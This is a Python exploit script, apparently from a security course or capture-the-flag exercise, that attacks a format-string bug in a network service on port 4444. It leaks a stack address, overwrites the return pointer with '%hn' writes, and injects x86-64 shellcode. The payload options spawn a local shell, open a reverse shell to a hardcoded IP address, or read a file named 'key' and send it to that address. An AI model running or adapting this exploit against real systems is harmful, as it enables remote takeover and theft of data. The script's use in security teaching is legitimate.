import socket
import sys
import time
import telnetlib

def flipBytes(unflipped):       # (to little endian)
        return unflipped[10:12] + unflipped[8:10] + unflipped[6:8] + unflipped[4:6] + unflipped[2:4] + unflipped[:2] + "0000"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

if len(sys.argv) < 3:
    print ("Need to provide host ip and/or type of shellcode in the command line!")
    print ("Types possible: 'reversebind' or 'shell' or 'key'")
    exit(1)
    
server_name = sys.argv[1]
server_address = (server_name, 4444)
print("connecting to %s port %s" % server_address)
sock.connect(server_address)


my_ip_addr = "\xAC\x10\x06\x6A"

try:

    data = sock.recv(1024)
    print("Received '%s'" % data)
    
    print("Sending '%1$p'")
    sock.send("%1$p\n".encode())
    time.sleep(0.1)     # for whatever reason if I don't sleep after the send it will not recv
    
    data = sock.recv(1024)
    bufpointer = data[1:len(data)-1]   # cut off \n at end
    print("Received '%s'" % bufpointer)
    d_bufpointer = int(bufpointer,16)
    d_returnpointer = d_bufpointer + 280
    d_shellpointer = d_bufpointer + 88          # 72 bytes for first part of payload, 16 extra into noops (and then there will be 16 more noops)
    returnpointer = hex(d_returnpointer)
    shellpointer = hex(d_shellpointer)[2:]
    print("Return pointer location: '%s'" % returnpointer)
    print("Jumping to: '0x%s' (16 noops before shellcode)" % shellpointer)
    
    #calc return pointer locations - since little endian, we need first two bytes, second two bytes, third two bytes. fourth always 0.
    returnpointer1 = str( bytearray.fromhex( flipBytes(returnpointer[2:]) ))            # $14
    returnpointer2 = str( bytearray.fromhex( flipBytes(hex(d_returnpointer+2)[2:]) ))   # $15
    returnpointer3 = str( bytearray.fromhex( flipBytes(hex(d_returnpointer+4)[2:]) ))   # $16
    print(flipBytes(returnpointer[2:]) + " " + flipBytes(hex(d_returnpointer+2)[2:]) + " " + flipBytes(hex(d_returnpointer+4)[2:]))
    
    #calc 
    # say that shellpointer = "7ffd48b7c338"
    # 7ffd 48b7 c338
    # $16  $15  $14
    format_hns = []
    format_hns.append( ( int(shellpointer[:4],16) , "%16$hn") )
    format_hns.append( ( int(shellpointer[4:8],16), "%15$hn") )
    format_hns.append( ( int(shellpointer[8:],16), "%14$hn") )
    format_hns = sorted(format_hns, key=lambda x: x[0])
    print(format_hns)
    
    #zfill just adds 0s in front if there isn't 5 chars already
    payload = "%" + str(format_hns[0][0]).zfill(5) + "x" + format_hns[0][1] 
    payload += "%" + str(format_hns[1][0] - format_hns[0][0]).zfill(5) + "x" + format_hns[1][1] 
    payload += "%" + str(format_hns[2][0] - format_hns[1][0]).zfill(5) + "x" + format_hns[2][1] 
    payload += "AAAAAAAAA"              # padding
    print(payload)
    payload = payload.encode()
    payload += returnpointer1 + returnpointer2 + returnpointer3 + "\x90"*32
    
    
    if (sys.argv[2]=="key"):
        payload += "\x48\x31\xff\xbf\x6b\x65\x79\x00\x57\x48\x89\xe7\x48\x31\xf6\xb8\x02\x00\x00\x00\x0f\x05\x49\x89\xc7\xb8" + my_ip_addr + "\x50\x66\x68\x15\xe0\x66\x6a\x02\xbf\x02\x00\x00\x00\xbe\x01\x00\x00\x00\x48\x31\xd2\xb8\x29\x00\x00\x00\x0f\x05\x48\x89\xc7\xba\x10\x00\x00\x00\xb8\x2a\x00\x00\x00\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb8\x21\x00\x00\x00\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf0\x6a\x67\x4c\x89\xff\x48\x89\xe6\xba\x01\x00\x00\x00\x31\xc0\x0f\x05\x48\x83\xf8\x01\x75\x16\xbf\x01\x00\x00\x00\x48\x89\xe6\xba\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xeb\xd5\xb8\x3c\x00\x00\x00\x31\xff\x0f\x05"
    elif (sys.argv[2]=="reversebind"):
        payload += "\xb8" + my_ip_addr + "\x50\x66\x68\x15\xe0\x66\x6a\x02\x6a\x2a\x6a\x10\x6a\x29\x6a\x01\x6a\x02\x5f\x5e\x48\x31\xd2\x58\x0f\x05\x48\x89\xc7\x5a\x58\x48\x89\xe6\x0f\x05\x48\x31\xf6\xb0\x21\x0f\x05\x48\xff\xc6\x48\x83\xfe\x02\x7e\xf3\x48\x31\xc0\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\x31\xf6\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05\x0a"
    elif (sys.argv[2]=="shell"):
        payload += "\x48\x31\xc0\x48\x31\xf6\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x57\x48\x89\xe7\x48\x31\xd2\xb0\x3b\x0f\x05"          
        
    else:
        print("Shellcode arg incorrect.")
        sock.close()
        exit()
    
    
    
    f = open('output1.txt','w')
    f.write(payload)
    f.close()
    
    
    payload += "\n"
    sock.send(payload)
    data = sock.recv(102400)
    sock.send("quit\n".encode())        # to trigger return jump
    data = sock.recv(1000)
    
    if (sys.argv[2]=="shell"):
        #
        #print("Received '%s'" % data)
        
        t=telnetlib.Telnet()            # thank you Alexis ;__;
        t.sock = sock
        t.interact()
            
    
    #payload = "%00000x" + "%16$hn" + "%00000x" + "%14$hn" + "%00000x" + "%15$hn" + "AAAAAAAAA" + "\x68\xED\xFF\xFF\xFF\x7F\x00\x00" + "\x6A\xED\xFF\xFF\xFF\x7F\x00\x00" + "\x6C\xED\xFF\xFF\xFF\x7F\x00\x00" + "\x90"*32

finally:
    print("Press enter")
    raw_input()
    #sock.close()